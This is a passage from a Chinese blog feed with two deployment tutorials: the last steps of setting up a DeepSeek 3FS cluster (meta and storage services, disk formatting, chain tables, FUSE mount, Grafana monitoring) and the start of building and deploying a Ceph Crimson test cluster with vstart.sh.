class="code"><pre><code class="hljs bash">[root@host01 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml <span class="hljs-string">&quot;init-cluster --mgmtd /opt/3fs/etc/mgmtd_main.toml 1 1048576 4&quot;</span><br>&gt; Execute init-cluster --mgmtd /opt/3fs/etc/mgmtd_main.toml 1 1048576 4<br>Init filesystem, root directory layout: chain table ChainTableId(1), chunksize 1048576, stripesize 4<br><br>Init config <span class="hljs-keyword">for</span> MGMTD version 1<br>&gt; Time: 41ms 220us 660ns<br><br>[root@host01 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-nodes&quot;</span><br>&gt; Execute list-nodes<br>Id  Type   Status         Hostname   Pid   Tags  LastHeartbeatTime  ConfigVersion  ReleaseVersion<br>1   MGMTD  PRIMARY_MGMTD  host01     6208  []    N/A                0(UPTODATE)    250523-dev-1-999999-ee9a5cee<br>&gt; Time: 375ms 823us 249ns<br></code></pre></td></tr></table></figure><h2 id="4-4、配置-meta"><a href="#4-4、配置-meta" class="headerlink" title="4.4、配置 meta"></a>4.4、配置 meta</h2><p>以下操作仅在 10.10.10.1 机器上执行。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化本机运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/meta_main /opt/3fs/bin<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/&#123;meta_main_launcher.toml,meta_main.toml,meta_main_app.toml&#125; /opt/3fs/etc<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/deploy/systemd/meta_main.service /usr/lib/systemd/system<br>ldd /opt/3fs/bin/meta_main<br><br><br><span class="hljs-comment"># 修改配置文件</span><br><span class="hljs-comment"># 修改配置文件 meta_main_app.toml [开始]</span><br>vi /opt/3fs/etc/meta_main_app.toml<br>node_id = 100<br><span class="hljs-comment"># 修改配置文件 meta_main_app.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 meta_main_launcher.toml [开始]</span><br>vi /opt/3fs/etc/meta_main_launcher.toml<br>cluster_id = <span class="hljs-string">&#x27;stage&#x27;</span><br><br>[mgmtd_client]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><span class="hljs-comment"># 修改配置文件 meta_main_launcher.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 meta_main.toml [开始]</span><br>vi /opt/3fs/etc/meta_main.toml<br>[common.monitor.reporters.monitor_collector]<br>remote_ip = <span class="hljs-string">&#x27;10.10.10.1:10000&#x27;</span><br><br>[server.fdb]<br>clusterFile = <span class="hljs-string">&#x27;/opt/3fs/etc/fdb.cluster&#x27;</span><br><br>[server.mgmtd_client]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><span class="hljs-comment"># 修改配置文件 meta_main.toml [结束]</span><br><br><br><span class="hljs-comment"># 上传 meta 配置</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type META --file /opt/3fs/etc/meta_main.toml&quot;</span><br><br><span class="hljs-comment"># 启动服务</span><br>systemctl start meta_main<br>systemctl status meta_main<br><br><span class="hljs-comment"># 查看集群节点</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-nodes&quot;</span><br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@host01 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type META --file /opt/3fs/etc/meta_main.toml&quot;</span><br>&gt; Execute set-config --<span class="hljs-built_in">type</span> META --file /opt/3fs/etc/meta_main.toml<br>Succeed<br>ConfigVersion  1<br>&gt; Time: 153ms 391us 74ns<br></code></pre></td></tr></table></figure><h2 id="4-5、配置-storage"><a href="#4-5、配置-storage" class="headerlink" title="4.5、配置 storage"></a>4.5、配置 storage</h2><p>这一步骤会在每台部署机器上格式化两个硬盘用作存储硬盘。以下操作在所有部署机器上执行。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化本机运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/storage_main /opt/3fs/bin<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/&#123;storage_main_launcher.toml,storage_main.toml,storage_main_app.toml&#125; /opt/3fs/etc<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/deploy/systemd/storage_main.service /usr/lib/systemd/system<br><br><span class="hljs-comment"># 修改配置文件</span><br><span class="hljs-comment"># 修改配置文件 storage_main_app.toml [开始]</span><br><span class="hljs-comment"># 由于是三台机器，所以这里的 node_id 分别设置为 10001, 10002, 10003</span><br>vi /opt/3fs/etc/storage_main_app.toml<br>node_id = 10001<br><span class="hljs-comment"># 修改配置文件 storage_main_app.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 storage_main_launcher.toml [开始]</span><br>vi /opt/3fs/etc/storage_main_launcher.toml<br>cluster_id = <span class="hljs-string">&#x27;stage&#x27;</span><br><br>[mgmtd_client]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><span class="hljs-comment"># 修改配置文件 storage_main_launcher.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 storage_main.toml [开始]</span><br>vi /opt/3fs/etc/storage_main.toml<br>[common.monitor.reporters.monitor_collector]<br>remote_ip = <span class="hljs-string">&quot;10.10.10.1:10000&quot;</span><br><br><span class="hljs-comment"># 由于我的测试环境内核版本低于 5.1，因此无法使用 io_uring 特性</span><br>[server.aio_read_worker]<br>enable_io_uring = <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 由于 mgmtd 和 storage 混部，所以会导致监听端口冲突，这里需要修改 storage 监听端口</span><br>[server.base.groups.listener]<br>listen_port = 8800<br><br><span class="hljs-comment"># 由于 mgmtd 和 storage 混部，所以会导致监听端口冲突，这里需要修改 storage 监听端口</span><br>[server.base.groups.listener]<br>listen_port = 9900<br><br>[server.mgmtd]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><br>[server.targets]<br>target_paths = [<span class="hljs-string">&quot;/storage/data1/3fs&quot;</span>,<span class="hljs-string">&quot;/storage/data2/3fs&quot;</span>,]<br><span class="hljs-comment"># 修改配置文件 storage_main.toml [结束]</span><br><br><span class="hljs-comment"># 调整 fs 配置</span><br><span class="hljs-built_in">cat</span> /proc/sys/fs/aio-max-nr<br>sysctl -w fs.aio-max-nr=67108864<br><br><span class="hljs-comment"># 格式化并挂载硬盘</span><br><span class="hljs-built_in">mkdir</span> -p /storage/data&#123;1..2&#125;<br>wipefs -a /dev/sdc<br>wipefs -a /dev/sdd<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sdc bs=1M count=100<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sdd bs=1M count=100<br>mkfs.xfs -L data1 /dev/sdc<br>mkfs.xfs -L data2 /dev/sdd<br>mount -o noatime,nodiratime -L data1 /storage/data1<br>mount -o noatime,nodiratime -L data2 /storage/data2<br><br><span class="hljs-comment"># 创建数据目录</span><br><span class="hljs-built_in">mkdir</span> -p /storage/data&#123;1..2&#125;/3fs<br><br><span class="hljs-comment"># 上传 storage 配置</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type STORAGE --file /opt/3fs/etc/storage_main.toml&quot;</span><br><br><span class="hljs-comment"># 启动服务</span><br>systemctl start storage_main<br>systemctl status storage_main<br><br><span class="hljs-comment"># 查看存储服务</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-nodes&quot;</span><br><br><span class="hljs-comment"># 查看存储目录数据</span><br><span class="hljs-built_in">ls</span> -al /storage/data1/3fs/<br><span class="hljs-built_in">ls</span> -al /storage/data1/3fs/engine/<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@host01 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type STORAGE --file /opt/3fs/etc/storage_main.toml&quot;</span><br>&gt; Execute set-config --<span class="hljs-built_in">type</span> STORAGE --file /opt/3fs/etc/storage_main.toml<br>Succeed<br>ConfigVersion  1<br>&gt; Time: 166ms 577us 72ns<br><br>[root@host02 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type STORAGE --file /opt/3fs/etc/storage_main.toml&quot;</span><br>&gt; Execute set-config --<span class="hljs-built_in">type</span> STORAGE --file /opt/3fs/etc/storage_main.toml<br>Succeed<br>ConfigVersion  2<br>&gt; Time: 366ms 424us 627ns<br><br>[root@host03 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type STORAGE --file /opt/3fs/etc/storage_main.toml&quot;</span><br>&gt; Execute set-config --<span class="hljs-built_in">type</span> STORAGE --file /opt/3fs/etc/storage_main.toml<br>Succeed<br>ConfigVersion  3<br>&gt; Time: 393ms 313us 534ns<br></code></pre></td></tr></table></figure><h2 id="4-6、配置存储拓扑"><a href="#4-6、配置存储拓扑" class="headerlink" title="4.6、配置存储拓扑"></a>4.6、配置存储拓扑</h2><p>以下操作仅在任意一台机器上执行即可。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建管理员用户</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;user-add --root --admin 0 root&quot;</span><br><br><span class="hljs-comment"># 保存 token 到 /opt/3fs/etc/token.txt</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;AAB8Mv7T8QC4wbtj2wCvb6vx&quot;</span> &gt; /opt/3fs/etc/token.txt<br><span class="hljs-built_in">cat</span> /opt/3fs/etc/token.txt<br><br><span class="hljs-comment"># 安装 Pyomo 和 HiGHS 所依赖的环境</span><br>pip3.8 install -r /root/3fs/3FS/deploy/data_placement/requirements.txt<br><br><span class="hljs-comment"># 生成数据放置方案</span><br><span class="hljs-comment"># 注意: --num_nodes 和 --replication_factor 的某些组合可能无法生成方案</span><br>python3.8 /root/3fs/3FS/deploy/data_placement/src/model/data_placement.py \<br>          -ql -relax -<span class="hljs-built_in">type</span> CR --num_nodes 3 --replication_factor 3 --min_targets_per_disk 3<br><br><span class="hljs-comment"># 生成存储目标和链表</span><br><span class="hljs-comment"># output 目录中将生成以下 3 个文件: create_target_cmd.txt 、 generated_chains.csv 和 generated_chain_table.csv 。</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 参数解释:</span><br><span class="hljs-comment">#   node_id_begin 和 node_id_end 表示起始 storage 的 node_id</span><br><span class="hljs-comment">#   num_disks_per_node 表示每个 node 上硬盘的数量</span><br><span class="hljs-comment">#   num_targets_per_disk 表示每块硬盘上存储 target 的数量</span><br>python3.8 /root/3fs/3FS/deploy/data_placement/src/setup/gen_chain_table.py \<br>          --chain_table_type CR \<br>          --node_id_begin 10001 \<br>          --node_id_end 10003 \<br>          --num_disks_per_node 2 \<br>          --num_targets_per_disk 3 \<br>          --target_id_prefix 1 \<br>          --chain_id_prefix 9 \<br>          --incidence_matrix_path output/DataPlacementModel-v_3-b_3-r_3-k_3-λ_2-lb_1-ub_1/incidence_matrix.pickle<br><br><span class="hljs-comment"># 创建 target</span><br>/opt/3fs/bin/admin_cli --cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> \<br>                       --config.user_info.token $(&lt;<span class="hljs-string">&quot;/opt/3fs/etc/token.txt&quot;</span>) &lt; output/create_target_cmd.txt<br><br><span class="hljs-comment"># 创建 chains</span><br>/opt/3fs/bin/admin_cli --cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> \<br>                       --config.user_info.token $(&lt;<span class="hljs-string">&quot;/opt/3fs/etc/token.txt&quot;</span>) <span class="hljs-string">&quot;upload-chains output/generated_chains.csv&quot;</span><br><br><span class="hljs-comment"># 创建 chain table</span><br>/opt/3fs/bin/admin_cli --cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> \<br>                       --config.user_info.token $(&lt;<span class="hljs-string">&quot;/opt/3fs/etc/token.txt&quot;</span>) <span class="hljs-string">&quot;upload-chain-table --desc stage 1 output/generated_chain_table.csv&quot;</span><br><br><span class="hljs-comment"># 查看配置</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-targets&quot;</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-chains&quot;</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;list-chain-tables&quot;</span><br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@host01 data]# /opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;user-add --root --admin 0 root&quot;</span><br>&gt; Execute user-add --root --admin 0 root<br>Uid                0<br>Name               root<br>Token              AACHi58S8QA8c9hP2wAOFNel(Expired at N/A)<br>IsRootUser         <span class="hljs-literal">true</span><br>IsAdmin            <span class="hljs-literal">true</span><br>Gid                0<br>SupplementaryGids<br>&gt; Time: 13ms 237us 420ns<br></code></pre></td></tr></table></figure><h2 id="4-7、客户端挂载使用"><a href="#4-7、客户端挂载使用" class="headerlink" title="4.7、客户端挂载使用"></a>4.7、客户端挂载使用</h2><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化本机运行目录和文件</span><br><span class="hljs-built_in">mkdir</span> -p /opt/3fs/&#123;bin,etc&#125; /var/log/3fs<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/build/bin/hf3fs_fuse_main /opt/3fs/bin<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/configs/&#123;hf3fs_fuse_main_launcher.toml,hf3fs_fuse_main.toml,hf3fs_fuse_main_app.toml&#125; /opt/3fs/etc<br><span class="hljs-built_in">cp</span> /root/3fs/3FS/deploy/systemd/hf3fs_fuse_main.service /usr/lib/systemd/system<br><br><span class="hljs-comment"># 保存 token 到 /opt/3fs/etc/token.txt</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;AAB8Mv7T8QC4wbtj2wCvb6vx&quot;</span> &gt; /opt/3fs/etc/token.txt<br><span class="hljs-built_in">cat</span> /opt/3fs/etc/token.txt<br><br><span class="hljs-comment"># 修改配置文件</span><br><span class="hljs-comment"># 修改配置文件 hf3fs_fuse_main_launcher.toml [开始]</span><br>vi /opt/3fs/etc/hf3fs_fuse_main_launcher.toml<br>cluster_id = <span class="hljs-string">&#x27;stage&#x27;</span><br>mountpoint = <span class="hljs-string">&#x27;/3fs/stage&#x27;</span><br>token_file = <span class="hljs-string">&#x27;/opt/3fs/etc/token.txt&#x27;</span><br><br>[ib_devices]<br>device_filter = [<span class="hljs-string">&#x27;rxe0&#x27;</span>]<br><br>[mgmtd_client]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><span class="hljs-comment"># 修改配置文件 hf3fs_fuse_main_launcher.toml [结束]</span><br><br><br><span class="hljs-comment"># 修改配置文件 hf3fs_fuse_main.toml [开始]</span><br>vi /opt/3fs/etc/hf3fs_fuse_main.toml<br>[common.monitor.reporters.monitor_collector]<br>remote_ip = <span class="hljs-string">&#x27;10.10.10.1:10000&#x27;</span><br><br>[mgmtd]<br>mgmtd_server_addresses = [<span class="hljs-string">&quot;RDMA://10.10.10.1:8000&quot;</span>]<br><span class="hljs-comment"># 修改配置文件 hf3fs_fuse_main.toml [结束]</span><br><br><br><span class="hljs-comment"># 应用 fuse client 配置</span><br>/opt/3fs/bin/admin_cli -cfg /opt/3fs/etc/admin_cli.toml --config.mgmtd_client.mgmtd_server_addresses <span class="hljs-string">&#x27;[&quot;RDMA://10.10.10.1:8000&quot;]&#x27;</span> <span class="hljs-string">&quot;set-config --type FUSE --file /opt/3fs/etc/hf3fs_fuse_main.toml&quot;</span><br><br><br><span class="hljs-comment"># 挂载客户端</span><br><span class="hljs-built_in">mkdir</span> -p /3fs/stage<br>systemctl start hf3fs_fuse_main<br>systemctl status hf3fs_fuse_main<br>mount | grep <span class="hljs-string">&#x27;/3fs/stage&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="五、集群监控"><a href="#五、集群监控" class="headerlink" title="五、集群监控"></a>五、集群监控</h1><p>目前 3FS 的监控指标数据存储在 clickHouse 中，我们可以使用 Grafana 来查询展示对应的监控指标数据。为此我整理了大量的监控指标面板数据并将其共享到了 Grafana Dashboards 中，你可以在 <a href="https://grafana.com/grafana/dashboards/?search=3fs">grafana&#x2F;dashboard&#x2F;3fs</a> 查询并获取对应的面板信息。</p><p>以下仅列出部分监控面板。</p><p><img src="/assets/images/3fs-dashboard-cluster.jpeg" alt="3FS Cluster" loading="lazy"></p><p><img src="/assets/images/3fs-dashboard-storage.jpeg" alt="3FS Storage" loading="lazy"></p><p><img src="/assets/images/3fs-dashboard-storage-detail.jpeg" alt="3FS Storage Detail" loading="lazy"></p><h1 id="六、参考资料"><a href="#六、参考资料" class="headerlink" title="六、参考资料"></a>六、参考资料</h1><ul><li><a href="https://github.com/deepseek-ai/3FS/blob/ee9a5cee0a85c64f4797bf380257350ca1becd36/deploy/README.md">https://github.com/deepseek-ai/3FS/blob/ee9a5cee0a85c64f4797bf380257350ca1becd36/deploy/README.md</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 3FS </tag>
            
            <tag> 分布式存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph Crimson 集群部署教程</title>
      <link href="/2025/01/12/ceph-crimson-deploy/"/>
      <url>/2025/01/12/ceph-crimson-deploy/</url>
      
        <content type="html"><![CDATA[<p>当前 ceph 集群搭建部署的方式主要有三种: ceph-ansible, vstart.sh 和 cephadm 。 其中 vstart.sh 脚本用于在开发环境中快速搭建测试集群。 ceph-ansible 是之前推荐的部署 ceph 集群的方式，支持在直接在宿主机上部署或者通过容器部署的方式，目前社区已不推荐使用。 cephadm 是当前最新的支持部署生产集群的方式，仅支持容器部署。接下来主要介绍通过 vstart.sh 和 cephadm 部署 crimson 集群的方式。</p><h1 id="一、vstart-sh-搭建集群"><a href="#一、vstart-sh-搭建集群" class="headerlink" title="一、vstart.sh 搭建集群"></a>一、vstart.sh 搭建集群</h1><p>通过这种方式部署的时候理论上对于 Ceph 版本没有特殊的要求，本文中使用的版本为 <a href="https://github.com/ceph/ceph/tree/v19.2.1">v19.2.1</a> 。</p><p>vstart.sh 常用于在开发环境环境中快速搭建集群，且在部署集群前我们需要编译出对应的二进制包。由于编译环境可能会有各种依赖缺失，版本异常等问题，这里推荐使用 <a href="https://github.com/bugwz/ceph-image/tree/main/squid/centos-9-stream/dev">bugwz&#x2F;ceph-images</a> 中提供的 CentOS Stream 9 的编译打包环境。同时后续的集群的搭建也可以在容器内部进行。</p><p><strong>搭建集群操作步骤如下:</strong></p><ol><li>软件编译: 使用开发容器镜像，编译对应的 ceph 代码，产出对应的二进制运行文件；</li><li>集群部署: 在开发容器内部使用 vstart.sh 脚本搭建测试集群；</li><li>集群测试: 验证集群功能特性是否正常；</li></ol><h2 id="1-1、软件编译"><a href="#1-1、软件编译" class="headerlink" title="1.1、软件编译"></a>1.1、软件编译</h2><blockquote><p><strong>注意:</strong> 2025年04月03日之后的代码版本中移除了 <code>WITH_SEASTAR</code> 变量，需要使用新变量 <code>WITH_CRIMSON</code> ，相关 <a href="https://github.com/ceph/ceph/commit/23c33f69ff977f7a05d3e3368e078b20e67a5ced">commit&#x2F;23c33f6</a> 。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入上述提供的容器开发环境</span><br><span class="hljs-comment"># 启动容器时需要使用 --privileged=true 参数，避免后续在容器内部部署集群时遇到 OSD 部署的权限问题</span><br><br><span class="hljs-comment"># 编译</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f v19.2.1<br>git submodule update --init --recursive<br><span class="hljs-built_in">export</span> FOR_MAKE_CHECK=<span class="hljs-literal">true</span><br>/root/ceph/install-deps.sh<br>/root/ceph/do_cmake.sh<br><span class="hljs-built_in">cd</span> /root/ceph/build/<br>ninja -j <span class="hljs-string">&quot;<span class="hljs-subst">$(expr $(nproc)</span> / 2)&quot;</span><br><br><br><span class="hljs-comment"># 编译 crimson</span><br><span class="hljs-built_in">cd</span> /root/ceph<br>git checkout -f v19.2.1<br>git submodule update --init --recursive<br><span class="hljs-built_in">export</span> FOR_MAKE_CHECK=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 2025年04月03日之后的代码使用 WITH_CRIMSON 替换了 WITH_SEASTAR</span><br><span class="hljs-built_in">export</span> WITH_SEASTAR=<span class="hljs-literal">true</span><br>/root/ceph/install-deps.sh<br><span class="hljs-comment"># 2025年04月03日之后的代码使用 WITH_CRIMSON 替换了 WITH_SEASTAR</span><br>/root/ceph/do_cmake.sh -DWITH_SEASTAR=ON<br><span class="hljs-built_in">cd</span> /root/ceph/build/<br>ninja -j <span class="hljs-string">&quot;<span class="hljs-subst">$(expr $(nproc)</span> / 2)&quot;</span><br></code></pre></td></tr></table></figure><h2 id="1-2、集群部署"><a href="#1-2、集群部署" class="headerlink" title="1.2、集群部署"></a>1.2、集群部署</h2><p>通过 vstart.sh 部署集群依赖 1.1 中产出的二进制文件，因此我们需要在对应的编译环境中搭建测试测试。</p><ul><li>各组件的配置文件位于 build 目录中的 ceph.conf 文件；</li><li>各组件的运行目录位于 build 目录中的 dev 目录；</li><li>各组件的日志目录位于 build 目录中的 out 目录；</li><li>各组件的管理 socket 位于 build 目录中的 asok 目录；</li></ul><p><strong>vstart.sh 脚本相关逻辑:</strong></p><ul><li>部署 <code>crimson-osd</code> 的时候，如果没有指定 <code>--crimson-smp</code> 参数，则默认会将 <code>crimson_smp</code> 参数值设置为 <code>1</code> ，并且在启动每个 <code>OSD</code> 前修改对应的 <code>crimson_seastar_cpu_cores</code> 参数。按照 <code>crimson-osd</code> 的启动逻辑，如果指定了 <code>crimson_seastar_cpu_cores</code> 参数，则不会使用 <code>crimson_seastar_num_threads</code> 配置，因此如果想要 <code>crimson_seastar_num_threads</code> 配置生效，就需要在 <code>vstart.sh</code> 脚本中注释掉位于 <code>start_osd</code> 函数中设置 <code>crimson_seastar_cpu_cores</code> 参数的逻辑。</li></ul><p><strong>操作如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 进入 build 目录</span><br><span class="hljs-comment"># 以下所有操作均位于 build 目录中执行</span><br><span class="hljs-built_in">cd</span> build<br><br><span class="hljs-comment"># 搭建非 crimson 集群</span><br>../src/vstart.sh -d -n<br><br><span class="hljs-comment"># 搭建后端存储为 alienstore(bluestore) 的 crimson 集群</span><br>../src/vstart.sh -d -n \<br>  --without-dashboard --redirect-output \<br>  --bluestore --crimson<br><br><span class="hljs-comment"># 搭建后端存储为 cyanstore(memstore) 的 crimson 集群</span><br>../src/vstart.sh -d -n \<br>  --without-dashboard --redirect-output \<br>  --cyanstore --crimson<br><br><span class="hljs-comment"># 搭建后端存储为 seastore 的 crimson 集群</span><br>../src/vstart.sh -d -n \<br>  --without-dashboard --redirect-output \<br>  --seastore --crimson<br><br><span class="hljs-comment"># 搭建后端存储为 seastore 的 crimson 集群，并调整集群的一些配置</span><br><span class="hljs-comment"># 该方式会在初始化集群配置文件的时候在所有组件中添加指定的配置</span><br>../src/vstart.sh -d -n \<br>  --without-dashboard --redirect-output \<br>  --seastore --crimson \<br>  -o <span class="hljs-string">&quot;<span class="hljs-subst">$(cat new.conf)</span>&quot;</span><br><br><span class="hljs-comment"># 停止非 crimson 集群</span><br>../src/stop.sh<br><br><span class="hljs-comment"># 停止 crimson 集群</span><br>../src/stop.sh --crimson<br><br><span class="hljs-comment"># 查看集群状态</span><br>./bin/ceph -s<br><br><span class="hljs-comment"># 查看集群 osd 组件的后端存储类型</span><br><span class="hljs-built_in">cat</span> ./dev/osd*/type<br></code></pre></td></tr></table></figure><h2 id="1-3、功能测试"><a href="#1-3、功能测试" class="headerlink" title="1.3、功能测试"></a>1.3、功能测试</h2><h3 id="1-3-1、测试-RBD-功能"><a href="#1-3-1、测试-RBD-功能" class="headerlink" title="1.3.1、测试 RBD 功能"></a>1.3.1、测试 RBD 功能</h3><p>需要注意，容器环境中可能没有对应的 rbd 内核模块，下面的执行命令可能会失败。</p><p><strong>相关命令:</strong> （以下命令执行的相对路径均位于 ceph&#x2F;build 目录中）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 rbd pool</span><br>./bin/ceph osd pool create rbdpool 64 64<br>./bin/ceph osd pool application <span class="hljs-built_in">enable</span> rbdpool rbd<br>./bin/ceph osd pool <span class="hljs-built_in">set</span> rbdpool pg_autoscale_mode off<br><br><span class="hljs-comment"># 创建 rbd image</span><br>./bin/rbd create -p rbdpool --image rbdimg01 --size 10G<br><br><span class="hljs-comment"># 删除 rbd image</span><br>./bin/rbd <span class="hljs-built_in">rm</span> --pool rbdpool --image rbdimg01<br><br><span class="hljs-comment"># 查看 rbd image 信息</span><br>./bin/rbd info rbdpool/rbdimg01<br><br><span class="hljs-comment"># krbd 方式映射 rbd image (默认方式)</span><br><span class="hljs-comment"># 由于 crimson osd 仅支持 message v2, 因此我们需要切换为 message v2进行连接通信</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/tools/rbd/action/Kernel.cc#L120</span><br>./bin/rbd device map -t krbd rbdpool/rbdimg01 -o mount_timeout=5,ms_mode=crc<br><br><span class="hljs-comment"># nbd 方式映射 rbd image</span><br><span class="hljs-comment"># 由于 crimson osd 仅支持 message v2, 因此我们需要切换为 message v2进行连接通信</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/tools/rbd_nbd/rbd-nbd.cc#L2118</span><br>./bin/rbd device map -t nbd rbdpool/rbdimg01<br><br><span class="hljs-comment"># 格式化 krbd 方式映射的 rbd image 并挂载</span><br>mkfs.xfs /dev/rbd0<br><span class="hljs-built_in">mkdir</span> -p /mnt/cephrbd<br>mount /dev/rbd0 /mnt/cephrbd<br><br><span 